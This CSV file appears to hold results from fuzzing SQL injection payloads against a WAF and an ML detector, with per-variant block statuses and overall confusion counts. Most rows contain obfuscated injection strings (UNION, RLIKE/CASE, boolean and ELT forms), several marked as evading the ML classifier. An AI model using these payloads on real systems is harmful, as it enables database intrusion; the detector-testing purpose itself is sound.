Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5,Fuzzed Payload 6,Fuzzed Timestamp 6,WAF Status 6,ML Status 6,Combined Result 6,Fuzzed Payload 7,Fuzzed Timestamp 7,WAF Status 7,ML Status 7,Combined Result 7,Fuzzed Payload 8,Fuzzed Timestamp 8,WAF Status 8,ML Status 8,Combined Result 8,Fuzzed Payload 9,Fuzzed Timestamp 9,WAF Status 9,ML Status 9,Combined Result 9,Fuzzed Payload 10,Fuzzed Timestamp 10,WAF Status 10,ML Status 10,Combined Result 10
14,2024-09-04T09:08:59.941508,"-4954%"""") or 5244=4832",403,403,403,both_correct,"-0x135a%"""")
Or 5244 like/**/(SELECT 8002=8002)",2024-09-04T09:09:00.988153,403,403,both_correct,"-0x135a%"""")
or 4160/**/liKE 4160 liKE/*27*/(seLEcT 8002= or	0x0)",2024-09-04T09:09:04.062494,403,200,waf_correct_ml_incorrect,"-0x135a%"""") Or 0x1040 liKe 4160 lIkE/*'y'<>'yY'*/(SelECt (SELECT 1) like  Or	0x0)",2024-09-04T09:09:08.100521,403,200,waf_correct_ml_incorrect,"-0x135a%"""") oR/*:Nr0*/0x1040 LIKe  Or 0x0 LiKE/**/(SeLeCT (sELect '1m'!='1m5') likE  Or 0x0)",2024-09-04T09:09:13.197654,403,200,waf_correct_ml_incorrect,"-0x135a%"""") Or/*B&)M*/0x1040 lIke  oR 0x0 LiKE/**/(seLECT (selECt '1m' NOT LIKE '1m5') LIke
 Or/**/0x0)",2024-09-04T09:09:18.562581,403,403,both_correct,"-0x135a%"""") Or/*B&)M*/0x1040 lIKe  or 0x0
liKe/**/(SeLECt/**/(selEct '1m' not like '1m5') LiKe
 Or/*[7*/0x0)",2024-09-04T09:09:24.283250,403,200,waf_correct_ml_incorrect,"-0x135a%"""") OR/*B&)M*/0x1040 like  Or/**/0x0
liKE/**/(SEleCT/**/(SeLECt '1m' not like '1m5') lIKe	 OR/*[(SELECT  AND 'w'!='wO')*/0x0)",2024-09-04T09:09:30.419608,403,403,both_correct,"-0x135a%"""") OR/*B&)M*/0x1040 LikE  OR/**/0x0
liKE (SeLeCT/**/(SeLECT '1m' not like '1m5') LiKE  or/*[(SELECT  AND 'w'!='wO')*/0x0)",2024-09-04T09:09:37.497129,403,403,both_correct,"-0x135a%"""") oR/*B&)M*/0x1040
LIke  or/**/0x0
like (SelEct (SelEcT '1m' not like '1m5') LIke  oR/*[(SELECT  AND 'w'!='wO')*/0x0)",2024-09-04T09:09:44.603513,403,403,both_correct,"-0x135a%"""")
||/*B&)M*/0x1040
lIKE  Or 0x0
lIKE (sELect (selECT '1m' not like '1m5') lIkE  or/*[(SELECT  AND 'w'!='wO')*/0x0)",2024-09-04T09:09:51.697758,403,200,waf_correct_ml_incorrect
15,2024-09-04T09:09:58.281536,"-9356 or elt(1032=1032,3623)-- izgi",403,403,403,both_correct,"-9356
or elt('F' NOT LIKE/**/'Fi'= OR 0,0xe27)-- izgi1O",2024-09-04T09:09:59.920532,403,403,both_correct,"-0x248c	or elt('F' not like 'Fi'= or  AND 1=4527,0xe27)-- izgi1OA",2024-09-04T09:10:03.371988,403,200,waf_correct_ml_incorrect,"-0x248c Or elt('F'/**/not like 'Fi' like  Or  anD 0x1= AnD ';' LIKE ';',0xe27)-- izgi1OA?",2024-09-04T09:10:07.727844,403,403,both_correct,"-0x248c OR/*
J/*/elt('F'/**/not like 'Fi' LIke  or  AnD 0x1 like  AND ';' LIke ';',0xe27)--	izgi1OA?",2024-09-04T09:10:12.941346,403,403,both_correct,"-0x248c or/*
J/*/elt('F'/**/not like 'Fi' LIke  or  aNd/**/0x1 lIKE  && ';' liKE ';',0xe27)-- izgi1OA? """,2024-09-04T09:10:19.111983,403,200,waf_correct_ml_incorrect,"-0x248c OR/* J/*/elt('F'/**/not like 'Fi' LIkE  Or  AND/**/0x1 Like   And /**/';' lIke ';',0xe27)-- izgi1OA? ""!",2024-09-04T09:10:25.021993,403,200,waf_correct_ml_incorrect,"-0x248c or/* J/*/elt('F' not
like 'Fi' lIKe  Or  anD/**/0x1 LiKe   and /*P:*O*/';' lIKE ';',0xe27)-- izgi1OA? ""!",2024-09-04T09:10:30.906451,403,200,waf_correct_ml_incorrect,"-0x248c or/* J/*/elt('F' not	like 'Fi' liKE  ||  And/*N*/0x1 LiKe/**/  AnD /*P:*O*/';' LiKE ';',0xe27)-- izgi1OA? ""!",2024-09-04T09:10:38.569527,403,200,waf_correct_ml_incorrect,"-0x248c OR/*/**/J/*/elt('F' not like 'Fi' Like   oR   aNd/**/0x1 liKe/**/  AnD /*P:*O*/';' liKe ';',0xe27)-- izgi1OA? ""!z:",2024-09-04T09:10:45.158616,403,200,waf_correct_ml_incorrect,"-0x248c ||/*/**/J/*/elt('F' not like 'Fi' LIkE 	 or   anD 0x1 liKE/*N}N*/  ANd /*P:*O*/';' lIke ';',0xe27)-- izgi1OA? ""!z:",2024-09-04T09:10:53.060508,403,200,waf_correct_ml_incorrect
16,2024-09-04T09:11:00.419075,1'))) rlike (select (case when (5524=9582) then 1 else 0x28 end)) and ((('okoj' like 'okoj,403,403,403,both_correct,"0x1')))/*
*/rlike (select (case when (5524=9582) then 1976 LIKE  OR 0 else 0x28 end))	and ((('okoj' like 'okoj",2024-09-04T09:11:04.721919,403,403,both_correct,"0x1')))/**/rlike (select (case/**/when (5524=0x256e)
then  AND 1 NOT LIKE 4363 LIKE  OR 0 else 0x28 end))	and ((('okoj' like 'okoj",2024-09-04T09:11:11.038722,403,403,both_correct,"0x1')))/**/rlike (select (case/**/when ((SELECT 1)=0x256e)	then  AND 0x1/**/NOT LIKE 4718 IN (4717,4718,4719) LIKE  OR 0 else 0x28 end))	and ((('okoj' like 'okoj",2024-09-04T09:11:17.706160,403,403,both_correct,"0x1')))/**/rlike (select (case when ((SELECT (SELECT 1))=0x256e) then  AND 0x1/*#fu */NOT LIKE 3847!=3848 IN (4717,(SELECT 4718),4719) LIKE  OR 0 else 0x28 end))	and ((('okoj' like 'okoj",2024-09-04T09:11:26.353492,403,403,both_correct,"0x1')))/**/rlike (select (case when ((SELECT (SELECT 1))=0x256e) then /**/AND 0x1/*)'mm'='mm'>J9*/NOT LIKE 3847!=3848 IN ((SELECT  AND 1),(SELECT	4718),4719) LIKE  OR 0 else 0x28 end))	and ((('okoj' like 'okoj",2024-09-04T09:11:36.305493,403,403,both_correct,"0x1')))/*Zl4*/rlike (select (case when ((SELECT (SELECT 1))=0x256e) then  AND 0x1/*)'mm'='mm'>J9*/NOT LIKE (SELECT 3847)!=3848 IN ((SELECT  AND 'z' NOT LIKE 'z]'),(SELECT
4718),4719) LIKE  OR (SELECT 1) else 0x28 end))	and ((('okoj' like 'okoj",2024-09-04T09:11:47.745819,403,403,both_correct,"0x1')))/*u*/rlike (select (case when ((SELECT (SELECT 1))=0x256e) then  AND 0x1/*)'mm'='mm'>J9*/NOT LIKE (SELECT 3847)!= OR 6299 IN/**/(6298,6299,6300) IN ((SELECT  AND 'z' NOT LIKE 'z]'),(SELECT
(SELECT 4718)),4719) LIKE  OR (SELECT 1) else 0x28 end)) and ((('okoj' like 'okoj",2024-09-04T09:11:59.868908,403,403,both_correct,"0x1')))/*u*/rlike (select (case when ((SELECT (SELECT 1))=0x256e) then  AND 0x1/*)'mm'='mm'>J9*/NOT LIKE (SELECT (SELECT 1))!= OR 6299 IN (6298,6299,(SELECT 1590) IN (1589,1590,1591)) IN ((SELECT  AND 'z' NOT LIKE 'z]'),(SELECT
(SELECT 4718)),4719) LIKE  OR (SELECT 1) else 0x28
end)) and ((('okoj' like 'okoj",2024-09-04T09:12:13.105657,403,403,both_correct,"0x1')))/**/rlike (select (case when ((SELECT (SELECT  AND 1))=0x256e) then  AND 0x1/*)'mm'='mm'>J9*/NOT/**/LIKE (SELECT (SELECT 1))!= OR 6299 IN (6298,'$x' LIKE '$x',(SELECT 1590) IN (1589,1590,(SELECT 1591))) IN ((SELECT  AND 'z' NOT LIKE 'z]'),(SELECT
(SELECT 4718)),4719) LIKE  OR (SELECT 1) else 0x28 end)) and ((('okoj' like 'okoj",2024-09-04T09:12:28.045384,403,403,both_correct,"0x1')))/**/rlike (select (case when ((SELECT (SELECT  AND 1))=0x256e) then  AND 0x1/*)'mm'='mm'>J9*/NOT/*M*/LIKE (SELECT/**/(SELECT 1))!= OR 6299 IN ((SELECT 1),'$x' LIKE '$x',(SELECT 1590) IN ((SELECT 1589),1590,(SELECT 1591))) IN ((SELECT  AND 'z' NOT LIKE 'z]'),(SELECT	(SELECT 4718)),'JF=b'='JF like b') LIKE  OR (SELECT 1) else 0x28 end)) and ((('okoj' like 'okoj",2024-09-04T09:12:44.594209,403,403,both_correct
17,2024-09-04T09:13:01.837601,"1'+(select yfuu where 1717=1717 union all select null,null,null,null,null,null,null,null,null--",403,403,403,both_correct,"0x1'+(seLect yfuu whERE 1717 LIKE	 ANd/**/7149 NOT LIKE 7150 union all seLecT null,null,null,null,null,null,null,null,null--",2024-09-04T09:13:06.504356,403,403,both_correct,"0x1'+(SELECT yfuu wheRe 8132 In (8131,8132,8133)/**/LiKE	 and/**/ or (sElECt 0) NOT LIKE 7150
union all sELECt null,null,null,null,null,null,null,null,null--",2024-09-04T09:13:13.090522,403,403,both_correct,"0x1'+(SELECT yfuu wheRe 8132 In ((SELECT 8131), OR 0,8133)
LiKE	 and/**/ or (sElECt '\]'='\]') not like 7150
union all sELeCt null,null,null,null,null,null,null,null,null--",2024-09-04T09:13:20.913085,403,403,both_correct,"0x1'+(SELECT yfuu wheRe 8132 In ((SELECT 8131), OR  OR 0,(SELECT 7478)!=7479)
LiKE  and/**/ or (sElECt '\]'='\]') not like 7150
union all/**/SElEcT null,null,null,null,null,null,null,null,null--",2024-09-04T09:13:31.066587,403,403,both_correct,"0x1'+(SELECT yfuu wheRe (SELECT 8132) In ((SELECT 8131), OR  OR 0,(SELECT 8843 NOT LIKE 8844)!= OR 0)
LiKE  and  or (sElECt '\]'='\]') not like 7150 union all/*8L+*/SElEcT null,null,null,null,null,null,null,null,null--",2024-09-04T09:13:41.408571,403,403,both_correct,"0x1'+(SELECT yfuu wheRe (SELECT 8132) In ((SELECT 8131), OR  OR '7' NOT LIKE '7X',(SELECT 0x228b NOT LIKE 8844)!= OR 0)
LiKE/**/ and  or (sElECt '\]'='\]') not
like  OR 0 union all/**/sELECT null,null,null,null,null,null,null,null,null--",2024-09-04T09:13:52.961386,403,403,both_correct,"0x1'+(SELECT yfuu wheRe (SELECT 8132) In ((SELECT 8131), OR 	OR '7' NOT LIKE '7X',(SELECT 0x228b NOT LIKE 't'='t')!= OR  AND 1)
LiKE/**/ and  or (sElECt/**/'\]'='\]') not
like  OR (SELECT 0) union all/**/selecT null,null,null,null,null,null,null,null,null--",2024-09-04T09:14:05.244442,403,403,both_correct,"0x1'+(SELECT yfuu wheRe (SELECT  OR (SELECT 0)) In ((SELECT 8131), OR 	OR	'8490!=8491' NOT LIKE '7X',(SELECT 0x228b NOT LIKE 't'='t')!= OR  AND 1)
LiKE/*\7*/ and  or (sElECt/**/'\]'='\]') not
like  || (seLECT 0) union all SElect null,null,null,null,null,null,null,null,null--",2024-09-04T09:14:17.728590,403,403,both_correct,"0x1'+(SELECT yfuu wheRe (SELECT  OR (SELECT 0)) In ((SELECT 8131), OR 	OR '8490!=8295 NOT LIKE 8296' NOT LIKE '7X',(SELECT 0x228b NOT LIKE 't'='t')!=/**/OR  AND 1)
LiKE/*\(SELECT (SELECT 1))*/ and  or (sElECt/**/'\]'='\]') not
like   OR  (seLecT 0) union all SElect null,null,null,null,null,null,null,null,null--",2024-09-04T09:14:31.654527,403,403,both_correct,"0x1'+(SELECT yfuu wheRe (SELECT  OR (SELECT 0)) In ((SELECT 8131), OR 
OR '(sElEct 8490)!=(sEleCt 1) NOT LIKE 8296' NOT LIKE '7X',(SELECT 0x228b NOT LIKE 't'='t')!= OR  AND 5425!=5426)
LiKE/*\(SELECT (SELECT 1))*/ and  or (sElECt/**/'\]'='\]') not
like   ||  (seLEcT 0) union all seLECt null,null,null,null,null,null,null,null,null--",2024-09-04T09:14:49.451138,403,403,both_correct
18,2024-09-04T09:15:06.793071,c/ guillen santacilla 94,200,200,200,both_correct,"c/	guillen santacilla/**/0x5e",2024-09-04T09:15:08.284861,200,200,both_correct,"c/	guillen
santacilla 0x5e",2024-09-04T09:15:13.832081,200,200,both_correct,"c/	guillen	santacilla/*v	vJ*/0x5e",2024-09-04T09:15:16.159258,200,200,both_correct,"c/ guillen	santacilla/**/0x5e",2024-09-04T09:15:18.766720,200,200,both_correct,c//*\}3C*/guillen santacilla/**/0x5e,2024-09-04T09:15:21.270088,200,200,both_correct,c//*\}3C*/guillen/**/santacilla/*w33$*/0x5e,2024-09-04T09:15:24.032146,200,200,both_correct,"c//**/guillen	santacilla/*%-h)*/0x5e",2024-09-04T09:15:27.179820,200,200,both_correct,c//*|k3p*/guillen/**/santacilla/*%-h)*/0x5e,2024-09-04T09:15:29.983488,200,200,both_correct,"c//*|k3p*/guillen
santacilla/*%-h)*/0x5e",2024-09-04T09:15:33.132599,200,200,both_correct,c//*|k3p*/guillen santacilla/*%-h)*/0x5e,2024-09-04T09:15:36.208680,200,200,both_correct
19,2024-09-04T09:15:39.175226,-9100) or 8792=9550--,403,403,403,both_correct,"-4368=4368)/**/oR  ||
0=0x254e--",2024-09-04T09:15:40.276967,200,403,waf_incorrect_ml_correct,"-4368 like (SEleCt (SELECT 1)))/**/OR /**/||	'l'!='l{'=0x254e--",2024-09-04T09:15:44.372946,403,403,both_correct,"-(SELECT  OR 0) LiKE (SeLEcT (SeLECt 'sAd'!='sAdi'))) oR /**/||	'l'!='l{' LIKE	0x254e--",2024-09-04T09:15:48.542943,403,403,both_correct,"-(SelECT  Or/**/'|' LiKE '|') lIkE (SElect (SeLeCt 'sAd'!='sAdi'))) Or /**/|| 'l'!='l{' Like	0x254e--",2024-09-04T09:15:54.102334,403,200,waf_correct_ml_incorrect,"-(seLECT  Or/**/'|' LIke/**/'|') Like (SELECT (sEleCT 'sAd'!='sAdi')))	oR /*KQ~wT*/|| 'l'<>'l{' lIKe	0x254e--",2024-09-04T09:15:59.867562,403,403,both_correct,"-(SELeCt  OR/**/'|' likE/**/'|') lIKe/**/(SElecT (SeLEct 'sAd'!='sAdi')))	Or /*KQ~wT*/|| 'l'!='l{'
LikE	0x254e--",2024-09-04T09:16:06.406440,403,200,waf_correct_ml_incorrect,"-(selECT /**/||/**/'|' liKe/**/'|') likE/**/(SeLECT (sELEcT
'sAd'!='sAdi')))	or /*KQ~wT*/|| 'l'!='l{'
like	0x254e--",2024-09-04T09:16:12.517897,403,200,waf_correct_ml_incorrect,"-(seLECT /**/|| '|' like/**/'|') LIkE/**/(SeLEct (selECt
'sAd'!='sAdi'))) OR /**/|| 'l'!='l{'
LikE	0x254e--",2024-09-04T09:16:19.788043,403,200,waf_correct_ml_incorrect,"-(sElEct /**/|| '|' LIKE/**/'|')/**/LIke/**/(SeLeCt (SElECt
'sAd'<>'sAdi'))) or /*<cfC*/|| 'l'!='l{'
lIKE
0x254e--",2024-09-04T09:16:25.723289,403,200,waf_correct_ml_incorrect,"-(seLECT	/*b#( */|| '|' lIkE '|')/**/liKe/**/(sELEcT (sElEcT
'sAd'!='sAdi'))) Or /*<cfC*/|| 'l'!='l{'
liKE
0x254e--",2024-09-04T09:16:31.759826,403,200,waf_correct_ml_incorrect
20,2024-09-04T09:16:38.518566,"1""""))) and 7533=7533 and (((""""alvd"""" like """"alvd",403,200,403,waf_incorrect_ml_correct,"4920=4920""""))) AnD  aNd 1=(select 7533)/**/and (((""""alvd"""" LIkE	""""alvd",2024-09-04T09:16:40.729713,200,403,waf_incorrect_ml_correct,"4920=' OR 0
' LiKE '0
'"""")))/**/aND  aNd 0x1=(SelECt 7533)/*0*/AND (((""""alvd"""" LIKe
""""alvd",2024-09-04T09:16:45.387625,403,403,both_correct,"4920=' OR 9474!=9475
' lIkE	'0
'"""")))/**/AnD  aND 0x1 like (SeLeCt 0x1d6d)/*(SELECT/**/1)*/ANd (((""""alvd"""" LiKE
""""alvd",2024-09-04T09:16:50.451490,403,200,waf_correct_ml_incorrect,"4920 like ' OR (SELECT 9474)!= OR 0
' lIkE	'0
'"""")))/**/anD  anD 0x1 lIkE (SeLeCT 0x1d6d)/*(SELECT '	'!='	j')*/and (((""""alvd"""" LiKe	""""alvd",2024-09-04T09:16:56.605442,403,403,both_correct,"4920 lIkE ' OR (SELECT 	AND 0x1<>276)!= OR 0
' LiKE	'0
'"""")))/**/ANd  AnD 0x1 lIKE (SelecT 0x1d6d)/*(SELECT '	'!='	j')*/and/**/(((""""alvd"""" likE	""""alvd",2024-09-04T09:17:03.671975,403,403,both_correct,"'H'<>'H/' like ' OR (SELECT 	AND 0x1<> OR 0)!= OR 0x0
' lIKe	'0
'"""")))/*\W'i*/and /**/and 0x1	likE (sELECT 0x1d6d)/*(SELECT '	'!='	j')*/aNd/**/(((""""alvd"""" lIkE	""""alvd",2024-09-04T09:17:12.132775,403,403,both_correct,"'H'<>'H/' lIKE ' OR (SELECT 	AND 0x1<> OR 5627<>0x15fc)!= OR 0x0 ' like	' OR 0
'"""")))/*U2*/AND /**/And 0x1	like (selecT 0x1d6d)/*(SELECT '	'!='	j')*/AND (((""""alvd"""" LIkE	""""alvd",2024-09-04T09:17:21.394633,403,403,both_correct,"'H'<>'H/' LikE ' OR/**/(SELECT 	AND 0x1<> OR 9002=9002<>0x15fc)!= OR 0x0
' LIkE	' OR (SELECT (SELECT 1))
'"""")))/**/&& /*-z*/anD 0x1	lIke (sELeCt 0x1d6d)/*(SELECT '	'!='	j')*/and (((""""alvd"""" lIkE	""""alvd",2024-09-04T09:17:32.380035,403,403,both_correct,"'H'<>'H/' LIKE ' OR (SELECT 	AND 0x1<> OR  OR 0='3qC'<>'3qC1'<>0x15fc)!= OR 0x0
' LIkE	' OR (SELECT (SELECT 0x1))
'"""")))/*0j,.e*/ aND 	/*-z*/And 0x1	LIkE (sEleCt 0x1d6d)/*(SELECT '	'!='	j')*/AND (((""""alvd"""" lIke	""""alvd",2024-09-04T09:17:43.660485,403,403,both_correct,"'H'<>'H/' LIke ' OR (SELECT 	AND 0x1<> OR  OR (SELECT (SELECT 1413<>1414))='3qC'<>'3qC1'<>0x15fc)!= OR 0x0
' lIke	' OR (SELECT (SELECT 0x1))	'"""")))/***/ aND 	 ANd 0x1	likE (SelEct 0x1d6d)/*(SELECT '	'!='	j')*/aND (((""""alvd"""" lIKE	""""alvd",2024-09-04T09:17:55.123589,403,403,both_correct
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Overall Results,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WAF TP,161,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WAF TN,25,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WAF FP,8,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
WAF FN,26,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML TP,140,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML TN,23,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML FP,10,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML FN,47,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Combined Results (2x2 Matrix),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,WAF Correct,WAF Incorrect,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML Correct,142,21,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ML Incorrect,44,13,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
